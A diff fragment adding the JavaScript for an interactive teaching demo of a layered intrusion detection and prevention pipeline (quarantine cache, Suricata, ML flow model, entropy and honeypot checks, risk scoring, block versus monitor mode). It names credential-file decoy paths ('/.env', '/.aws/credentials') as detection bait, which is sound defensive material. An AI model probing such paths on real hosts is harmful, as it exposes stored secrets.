+      'Nineteen statistical flow features (packet rate, inter-arrival time, flag ratios) give an anomaly probability far below the threshold τ* = 0.64.',
+      [ch('ML prob', c.p.toFixed(2), 'green')].concat(featChips(c))), `p = ${c.p.toFixed(2)}`));
+    st.push(sb(mk('l3','green','check','Clean',`Layer 3: entropy ${c.entropy} bits/byte`,
+      'Entropy is below the 4.85 threshold and the request does not touch any zero-trust decoy path.',
+      [ch('Entropy', c.entropy + ' bits/B', 'green'), ch('Decoy paths','None touched','green')]), `H = ${c.entropy} bits/B`));
+    st.push(mk('benign','green','check','Verified','Classification: verified benign',
+      'The request passed all four layers without triggering an engine, so no threat risk score is produced (score 0).',
+      [ch('Verdict','SAFE','green'), ch('Risk score','0','green')]));
+    st.push(mk('safe','green','check','200 Allowed','HTTP 200: allowed to the server',
+      'Normal business query reaches the production server unimpeded, whichever Block Mode is set.',
+      [ch('Response','200 ALLOWED','green'), ch('Block mode', B ? 'ON' : 'OFF')]));
+    return st;
+  }
+
+  if (k === 'quarantine'){
+    if (B){
+      st.push(sb(mk('l0','fuchsia','alert','Quarantine hit','Layer 0: banned IP caught in memory',
+        `<code>${c.src_ip}</code> was banned earlier (SQL injection). The pre-filter finds it in <b>0.01 ms</b> and drops the request before Suricata or the ML model spend any CPU.`,
+        [ch('Banned for','SQLi','fuchsia'), ch('Latency','0.01 ms','fuchsia')]), '0.01 ms cache hit'));
+      st.push(sb(mk('blocked','fuchsia','ban','403 Quarantined','HTTP 403: dropped at Layer 0',
+        'The connection is terminated at the pre-filter. The request never touches the deeper engines or the server.',
+        [ch('Response','403 QUARANTINED','fuchsia'), ch('CPU saved','Layers 1-3','green')]), 'Dropped at Layer 0', '403 Quarantined'));
+      return st;
+    }
+    st.push(sb(mk('l0','amber','minus','Passive','Layer 0: repeat offender, Block Mode OFF',
+      `<code>${c.src_ip}</code> is a known repeat offender, but with Block Mode OFF the pre-filter only observes. Traffic falls through to the inspection engines.`,
+      [ch('Block mode','OFF','amber')]), 'Passive (Block OFF)'));
+    st.push(sb(mk('l1','red','alert','Flagged','Layer 1: repeat probe inspected',
+      'Suricata evaluates the repeat probe and it is flagged as malicious repeat activity.',
+      [ch('Repeat IP', c.src_ip, 'red')]), 'Repeat flagged'));
+  }
+  else if (c.layer === 1){
+    st.push(sb(mk('l0','green','check','Clean','Layer 0: first-time IP',
+      `<code>${c.src_ip}</code> is not in the quarantine cache yet, so the request proceeds to Layer 1.`, [ch('Reputation','Clean','green')]), 'IP is clean'));
+    st.push(sb(mk('l1','red','alert','Signature hit',`Layer 1: Suricata SID ${c.sid} matched`,
+      `Deterministic rule match: <b>${esc(c.rule)}</b>. Flagged instantly, with no flow statistics needed.`,
+      [ch('SID', c.sid, 'red'), ch('Ruleset','ET OPEN','blue')]), `SID ${c.sid}`));
+  }
+  else if (c.layer === 2){
+    st.push(sb(mk('l0','green','check','Clean','Layer 0: first-time IP',
+      `<code>${c.src_ip}</code> is not in the quarantine cache yet, so the request proceeds to Layer 1.`, [ch('Reputation','Clean','green')]), 'IP is clean'));
+    st.push(sb(mk('l1','amber','minus','Bypassed','Layer 1: nothing to match',
+      'Volumetric and low-rate attacks carry no exploit string, so signature rules have nothing to catch. This is the gap Layer 2 exists to close.',
+      [ch('Payload','Zero signature','amber')]), 'No signature'));
+    st.push(sb(mk('l2','red','alert',`Anomaly p=${c.p.toFixed(3)}`,'Layer 2: flow statistics flag it',
+      'Asymmetric timing and abnormal flag or connection counts push the Random Forest probability above the threshold τ* = 0.64.',
+      featChips(c).concat([ch('ML prob', c.p.toFixed(3), 'violet'), ch('Threshold','τ* = 0.64','violet')])), `p = ${c.p.toFixed(3)}`));
+  }
+  else if (c.layer === 3){
+    st.push(sb(mk('l0','green','check','Clean','Layer 0: first-time IP',
+      `<code>${c.src_ip}</code> is not in the quarantine cache yet, so the request proceeds to Layer 1.`, [ch('Reputation','Clean','green')]), 'IP is clean'));
+    st.push(sb(mk('l1','amber','minus','Bypassed','Layer 1: no rule matches',
+      'The obfuscated payload or ordinary-looking HTTP probe matches no Suricata signature.', []), 'No signature'));
+    st.push(sb(mk('l2','amber','minus','Bypassed','Layer 2: flow looks normal',
+      'A single stream at a low packet rate looks ordinary to the volumetric flow model.', []), 'Normal flow'));
+    const honey = k === 'honeypot';
+    st.push(sb(mk('l3','red','alert', honey ? 'Decoy tripped' : 'High entropy','Layer 3: deep inspection catches it',
+      `<b>${esc(c.rule)}</b>. ${honey ? 'No legitimate client ever requests these paths, so any hit is hostile by definition.' : 'Packed or encrypted bytes have far higher entropy than normal HTTP content.'}`,
+      honey ? [ch('Detection','Honeypot decoy','cyan'), ch('Paths','/.env, /.aws/credentials','red')]
+            : [ch('Entropy', c.entropy + ' bits/B', 'red'), ch('Threshold','4.85 bits/B','cyan')]),
+      honey ? 'Decoy tripped' : `H = ${c.entropy} bits/B`));
+  }
+
+  st.push(sb(mk('risk','red','alert',`Score ${c.score}`,`Risk score ${c.score}: critical`,
+    'Four factors are combined into one triage score: severity 40%, detection confidence 30%, behavioral anomaly 20% and asset context 10%.',
+    [ch('Sev ×0.4',c.sev), ch('Conf ×0.3',c.conf), ch('Beh ×0.2',c.beh), ch('Ctx ×0.1',c.ctx), ch('Risk score',c.score,'red')]), `Score ${c.score}`));
+
+  st.push(sb(mk('gate', B ? 'green' : 'amber', B ? 'shield' : 'eye', B ? 'Block ON' : 'Block OFF', `IPS gate: Block Mode is ${B ? 'ON' : 'OFF'}`,
+    B ? 'The threat score triggers mitigation and the firewall actively terminates the connection.'
+      : 'Monitor-only mode: the alert is recorded on the SOC dashboard, but the attack is permitted through.',
+    [ch('Threat score', c.score, 'red'), ch('Block mode', B ? 'ON' : 'OFF', B ? 'green' : 'amber')]), B ? 'Block ON: drop' : 'Block OFF: log only'));
+
+  if (B){
+    st.push(sb(mk('blocked','red','ban','403 Blocked','HTTP 403: blocked and IP quarantined',
+      `The attack is terminated at the gate. <code>${c.src_ip}</code> is auto-enrolled in the Layer 0 quarantine, so its next request dies in 0.01 ms.`,
+      [ch('Response','403 BLOCKED','red'), ch('IP status','Auto-quarantined','fuchsia'), ch('Server reached','No','green')]), 'IP auto-quarantined'));
+  } else {
+    st.push(sb(mk('monitor','amber','eye','200 Allowed','HTTP 200: attack allowed through',
+      'The attack was detected and logged, but the firewall did not drop it. The malicious payload reaches the destination server.',
+      [ch('Response','200 ALLOWED','amber'), ch('Firewall state','Monitor only','amber'), ch('Server reached','Yes (vulnerable)','red')]), 'Payload reached server'));
+  }
+  return st;
+}
+
+/* ---------- STAGE ---------- */
+function initStage(){
+  const mkr = (id, col) => `<marker id="m-${id}" viewBox="0 0 12 12" refX="10" refY="6" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto"><path d="M2 2L10 6L2 10z" fill="${col}"/></marker>`;
+  $('edges').innerHTML = '<defs>' + mkr('grey', '#c3cde0') + Object.entries(TH).map(([n, v]) => mkr(n, v)).join('') + '</defs>' +
+    EDGES.map(e => `<path class="edge" id="e_${e.a}_${e.b}" d="${rpath(e.pts)}" marker-end="url(#m-grey)"/>`).join('');
+  $('labels').innerHTML = LABELS.map(([t, x, y]) => `<div class="elabel" style="left:${x}px;top:${y}px">${t}</div>`).join('');
+  $('nodes').innerHTML = Object.entries(NODES).map(([id, n]) =>
+    `<div class="node c-${n.c}${n.out ? ' out' : ''}" id="n_${id}" data-n="${id}" style="left:${n.x}px;top:${n.y}px">
+      <span class="nbadge" id="b_${id}"></span>
+      <div class="rico">${ic(n.i)}</div>
+      <div class="nt"><b id="t_${id}">${n.t}</b><small id="s_${id}">${n.s}</small></div>
+    </div>`).join('');
+}
+function fit(){
+  const w = $('stagewrap'), cv = $('canvas');
+  if (!w || !cv || !w.clientWidth) return;
+  const pad = 10, sc = Math.min((w.clientWidth - pad * 2) / 1200, (w.clientHeight - pad * 2) / 580);
+  cv.style.transform = `scale(${sc})`;
+  cv.style.left = ((w.clientWidth - 1200 * sc) / 2) + 'px';
+  cv.style.top = ((w.clientHeight - 580 * sc) / 2) + 'px';
+}
+
+function placeDot(steps, forward){
+  const dot = $('packet'), c = SC[key()], i = S.step;
+  dot.className = 'dot ' + (c.kind === 'safe' ? 'safe' : 'atk');
+  dot.innerHTML = ic(c.kind === 'safe' ? 'box' : 'zap');
+  cancelAnimationFrame(anim); clearTimeout(stopTimer);
+  const set = (x, y) => { dotPos = {x, y}; dot.style.transform = `translate(${x - 14}px,${y - 14}px)`; };
+  const el = i > 0 ? $(`e_${steps[i-1].n}_${steps[i].n}`) : null;
+  if (!el){
+    dot.style.transition = 'transform .5s cubic-bezier(.65,0,.25,1)';
+    set(NODES.term.x - W / 2 + 2, NODES.term.y);
+    return;
+  }
+  const L = el.getTotalLength(), end = el.getPointAtLength(L), start = el.getPointAtLength(0);
+  if (forward && dotPos){
+    dot.style.transition = 'none';
+    const from = {x:dotPos.x, y:dotPos.y}, t0 = performance.now(), D = 1100, lead = .28;
+    const frame = t => {
+      const p = Math.min(1, (t - t0) / D);
+      if (p < lead){ const q = p / lead; set(from.x + (start.x - from.x) * q, from.y + (start.y - from.y) * q); }
+      else {
+        const q = (p - lead) / (1 - lead), e = q < .5 ? 2 * q * q : 1 - Math.pow(-2 * q + 2, 2) / 2, pt = el.getPointAtLength(L * e);
+        set(pt.x, pt.y);
+      }
+      if (p < 1) anim = requestAnimationFrame(frame);
+    };
+    anim = requestAnimationFrame(frame);
+  } else {
+    dot.style.transition = 'transform .5s cubic-bezier(.65,0,.25,1)';
+    set(end.x, end.y);
+  }
+  if (steps[i].n === 'blocked') stopTimer = setTimeout(() => dot.classList.add('stopped'), 1150);
+}
+
+function renderSim(){
+  const k = key(), c = SC[k], steps = buildSteps();
+  S.step = Math.max(0, Math.min(S.step, steps.length - 1));
+  const cur = steps[S.step], path = steps.map(s => s.n);
+  const forward = last.k === k && last.b === S.block && last.step === S.step - 1;
+  fit();
+
+  $('scPill').className = 'pill t-' + CARD[k].tone;
+  $('scPill').innerHTML = ic(c.kind === 'safe' ? 'check' : 'zap') + esc(c.name);
+  syncSeg();
+
+  Object.entries(NODES).forEach(([id, n]) => {
+    const el = $('n_' + id), idx = path.indexOf(id);
+    let cls = 'node c-' + n.c + (n.out ? ' out' : ''), s = null;
+    if (idx === -1) cls += ' skipped';
+    else if (idx <= S.step){ s = steps[idx]; cls += ' reached t-' + s.tone + (idx === S.step ? ' cur' : ''); }
+    el.className = cls;
+    $('b_' + id).innerHTML = s ? ic(s.icon) + s.badge : '';
+    $('s_' + id).textContent = s && s.sub ? s.sub : n.s;
+    $('t_' + id).textContent = s && s.nodeT ? s.nodeT : n.t;
+  });
+
+  EDGES.forEach(e => {
+    const el = $(`e_${e.a}_${e.b}`);
+    let tone = null, isNew = false;
+    for (let i = 0; i < S.step; i++) if (path[i] === e.a && path[i+1] === e.b){ tone = steps[i+1].tone; isNew = i === S.step - 1; }
+    el.style.transition = 'none'; el.style.strokeDasharray = ''; el.style.strokeDashoffset = '';
+    if (tone){
+      el.classList.add('on'); el.style.stroke = TH[tone];
+      el.setAttribute('marker-end', `url(#m-${tone})`);
+      el.parentNode.appendChild(el);
+      if (isNew && forward){
+        const L = el.getTotalLength();
+        el.style.strokeDasharray = L; el.style.strokeDashoffset = L;
+        el.getBoundingClientRect();
+        el.style.transition = 'stroke-dashoffset .8s linear .25s';
+        el.style.strokeDashoffset = 0;
+        setTimeout(() => { el.style.strokeDasharray = ''; }, 1200);
+      }
+    } else {
+      el.classList.remove('on'); el.style.stroke = '';
+      el.setAttribute('marker-end', 'url(#m-grey)');
+    }
+  });
+
+  placeDot(steps, forward);
+
+  $('reqcard').innerHTML = `<div class="rq-h">Request in flight</div><div class="rq-name">${esc(c.name)}</div>
+    <div class="rq-meta"><span>source <b>${c.src_ip}</b></span><span>port <b>${c.port}</b></span><span>type <b>${esc(c.short)}</b></span></div>
+    <code>${esc(c.payload)}</code>
+    <div class="legend"><span><i style="background:#15803d"></i>clean</span><span><i style="background:#dc2626"></i>detected / blocked</span><span><i style="background:#d97706"></i>bypassed / allowed through</span><span><i style="background:#a21caf"></i>quarantined</span></div>`;
+
+  $('stepno').textContent = `Step ${S.step + 1} of ${steps.length}`;
+  $('captitle').textContent = cur.title;
+  $('capbody').innerHTML = cur.body;
+  $('chips').innerHTML = cur.chips.map(x => `<div class="chip t-${x.t}"><span>${x.k}</span><code>${x.v}</code></div>`).join('');
+  $('prog').style.width = ((S.step + 1) / steps.length * 100) + '%';
+  last = {k, b:S.block, step:S.step};
+}
+
+/* ---------- MODE / CHOOSE ---------- */
+function syncSeg(){
+  document.querySelectorAll('[data-seg]').forEach(seg => {
+    if (!seg.children.length) seg.innerHTML = `<button data-v="block">${ic('shield')}Block (IPS)</button><button data-v="monitor">${ic('eye')}Monitor (IDS)</button>`;
+    seg.querySelectorAll('button').forEach(b => b.classList.toggle('on', (b.dataset.v === 'block') === S.block));
+  });
+  $('modeDesc').textContent = S.block
+    ? 'Active IPS: attacks are dropped with a 403 and the source IP is banned. Benign traffic is unaffected.'
+    : 'Monitor only (IDS): threats are logged but not dropped, so the attack reaches the server. Use it to compare outcomes.';
+}
+function buildCards(){
+  $('cgrid').innerHTML = ORDER.map((k, i) => {
+    const c = SC[k], d = CARD[k];
+    return `<button class="sc t-${d.tone}" data-k="${k}">
+      <div class="top"><span class="tag">${d.tag}</span><kbd>${i + 1}</kbd></div>
+      <h3>${c.name}</h3><code>${esc(d.snip)}</code></button>`;
+  }).join('');
+  $('cgrid').onclick = e => { const b = e.target.closest('.sc'); if (b) selectScenario(b.dataset.k); };
+}
+function syncChoose(){
+  document.querySelectorAll('.sc').forEach(b => b.classList.toggle('sel', b.dataset.k === S.k));
+  syncSeg();
+}
+function selectScenario(k){
+  stopAutoPlay();
+  S.k = k; S.step = 0;
+  if (S.slide === 0) S.slide = 1;
+  if (S.slide >= 2) S.slide = 2;
+  render();
+}
+
+/* ---------- RESULT ---------- */
+function outcome(c, block){
+  if (c.kind === 'safe') return {tone:'green', code:200, label:'ALLOWED', icon:'check'};
+  if (key() === 'quarantine' && block) return {tone:'fuchsia', code:403, label:'QUARANTINED', icon:'ban'};
+  return block ? {tone:'red', code:403, label:'BLOCKED', icon:'ban'} : {tone:'amber', code:200, label:'ALLOWED (Block OFF)', icon:'eye'};
+}
+function renderResult(){
+  const k = key(), c = SC[k], o = outcome(c, S.block), steps = buildSteps();
+  $('resSub').textContent = `${c.name} · port ${c.port} · source ${c.src_ip}`;
+  const msg = {
+    red:'Dropped by the active IPS. The attack was terminated before reaching the destination server.',
+    fuchsia:'Dropped by the Layer 0 pre-filter in memory. No deeper engine had to run.',
+    amber:'Detected and logged in the SOC audit trail, but not dropped. The payload reached the server because Block Mode was OFF.',
+    green:'Normal verified traffic passed through untouched to the destination server.'
+  }[o.tone];
+  const hit = steps.find(s => ['l0','l1','l2','l3'].includes(s.n) && s.icon === 'alert');
+  const by = hit ? `Caught at ${NODES[hit.n].t}` : 'Clean through all four layers';
+  $('verdict').className = 'verdict t-' + o.tone;
+  $('verdict').innerHTML = `<div class="vi">${ic(o.icon)}</div><div class="code">${o.code}</div><div class="st">${o.label}</div><p>${msg}</p><div class="by">${ic(hit ? 'search' : 'check')}${by}</div>`;
+  $('mitreBadge').textContent = 'MITRE ATT&CK · ' + c.mitre;
+  $('trace').innerHTML = steps.map(s =>
+    `<div class="ts t-${s.tone}">${ic(s.icon)}<div><b>${NODES[s.n].short}</b><span>${s.badge}</span></div></div>`
+  ).join(`<span class="ar">${ic('right')}</span>`);
+  $('cmpRows').innerHTML = [true, false].map(b => {
+    const x = outcome(c, b);
+    return `<div class="cmprow ${b === S.block ? 'now' : ''}">
+      <div><b>Block mode ${b ? 'ON' : 'OFF'}</b><span class="d">${b ? 'Active IPS: threat dropped, IP quarantined' : 'IDS monitor: logged, not blocked'}</span></div>
+      <span class="badge t-${x.tone}">${x.code} ${x.label}</span></div>`;
+  }).join('');
+}
+
+/* ---------- AUTO-PLAY ---------- */
+function setAP(on){
+  const b = $('autoPlayBtn');
+  b.classList.toggle('primary', on);
+  b.innerHTML = ic(on ? 'pause' : 'play') + (on ? 'Pause' : 'Auto-play');
+}
+function stopAutoPlay(){
+  clearInterval(autoPlayTimer); autoPlayTimer = null;
+  clearTimeout(resultTimer); resultTimer = null;
+  setAP(false);
+}
+function startAutoPlay(){
+  if (!S.k) S.k = 'sqli';
+  const n = buildSteps().length;
+  if (S.slide !== 2){ S.slide = 2; S.step = 0; }
+  else if (S.step >= n - 1) S.step = 0;
+  setAP(true); render();
+  autoPlayTimer = setInterval(() => {
+    if (S.step < buildSteps().length - 1){ S.step++; render(); }
+    else {
+      clearInterval(autoPlayTimer); autoPlayTimer = null; setAP(false);
+      resultTimer = setTimeout(() => { S.slide = 3; render(); }, 2200);
+    }
+  }, 2800);
+}
+const toggleAutoPlay = () => autoPlayTimer ? stopAutoPlay() : startAutoPlay();
+
+/* ---------- NAVIGATION ---------- */
+const TOTAL = 4;
+const setNext = (txt, icon) => { $('next').innerHTML = txt + ic(icon); };
+function render(){
+  document.querySelectorAll('.slide').forEach((s, i) => {
+    s.classList.toggle('active', i === S.slide);
+    s.classList.toggle('past', i < S.slide);
+  });
+  $('dots').innerHTML = Array.from({length:TOTAL}, (_, i) => `<div class="dot-n ${i === S.slide ? 'on' : i < S.slide ? 'done' : ''}"></div>`).join('');
+  $('back').disabled = S.slide === 0;
+  $('next').disabled = false;
+  if (S.slide === 0) setNext('Start', 'right');
+  else if (S.slide === 1){ setNext('Run simulation', 'right'); $('next').disabled = !S.k; }
+  else if (S.slide === 2) setNext(S.step === buildSteps().length - 1 ? 'See verdict' : 'Next step', 'right');
+  else setNext('Restart', 'refresh');
+  syncChoose();
+  if (S.slide === 2) renderSim();
+  if (S.slide === 3) renderResult();
+}
+function next(){
+  if (S.slide === 1 && !S.k) return;
+  if (S.slide === 2 && S.step < buildSteps().length - 1){ S.step++; render(); return; }
+  stopAutoPlay();
+  if (S.slide === 3){ S.slide = 0; S.k = null; S.step = 0; }
+  else { S.slide++; if (S.slide === 2) S.step = 0; }
+  render();
+}
+function back(){
+  stopAutoPlay();
+  if (S.slide === 2 && S.step > 0){ S.step--; render(); return; }
+  if (S.slide === 3){ S.slide = 2; S.step = buildSteps().length - 1; render(); return; }
+  if (S.slide > 0){ S.slide--; render(); }
+}
+function setBlock(v){
+  const curN = S.slide === 2 ? buildSteps()[S.step].n : null;
+  S.block = v;
+  if (curN){ const i = buildSteps().findIndex(s => s.n === curN); S.step = i >= 0 ? i : 0; }
+  render();
+}
+const toggleFS = () => document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen && document.documentElement.requestFullscreen();
+
+/* ---------- INIT ---------- */
+$('miniflow').innerHTML = ['term','l0','l1','l2','l3','risk','gate'].map(id => `<div class="fl c-${NODES[id].c}"><span class="rico">${ic(NODES[id].i)}</span>${NODES[id].t}</div>`)
+  .join(`<div class="ar">${ic('right')}</div>`);
+$('back').innerHTML = ic('left') + 'Back';
+$('fs').innerHTML = ic('expand');
+$('flipBtn').innerHTML = ic('swap') + 'Flip mode and replay';
+$('againBtn').innerHTML = ic('refresh') + 'Try another scenario';
+setAP(false);
+buildCards();
+initStage();
+
+document.addEventListener('click', e => {
+  const sb2 = e.target.closest('[data-seg] button');
+  if (sb2){ setBlock(sb2.dataset.v === 'block'); return; }
+  const nd = e.target.closest('.node.reached');
+  if (nd){
+    const i = buildSteps().findIndex(s => s.n === nd.dataset.n);
+    if (i >= 0){ stopAutoPlay(); S.step = i; render(); }
+  }
+});
+$('autoPlayBtn').onclick = toggleAutoPlay;
+$('next').onclick = next;
+$('back').onclick = back;
+$('fs').onclick = toggleFS;
+$('flipBtn').onclick = () => { stopAutoPlay(); S.block = !S.block; S.slide = 2; S.step = 0; render(); };
+$('againBtn').onclick = () => { stopAutoPlay(); S.slide = 1; S.step = 0; render(); };
+window.addEventListener('resize', fit);
+
+document.addEventListener('keydown', e => {
+  if (e.metaKey || e.ctrlKey || e.altKey) return;
+  const onBtn = e.target.closest && e.target.closest('button');
+  if (e.key === 'ArrowRight' || ((e.key === ' ' || e.key === 'Enter') && !onBtn)){ e.preventDefault(); next(); }
+  else if (e.key === 'ArrowLeft'){ e.preventDefault(); back(); }
+  else if (e.key === 'p' || e.key === 'P'){ e.preventDefault(); toggleAutoPlay(); }
+  else if (e.key === 'b' || e.key === 'B'){ e.preventDefault(); setBlock(!S.block); }
+  else if (e.key === 'f' || e.key === 'F'){ e.preventDefault(); toggleFS(); }
+  else if (/^[1-8]$/.test(e.key)) selectScenario(ORDER[+e.key - 1]);
+});
+
+render();
+</script>
+</body>
+</html>
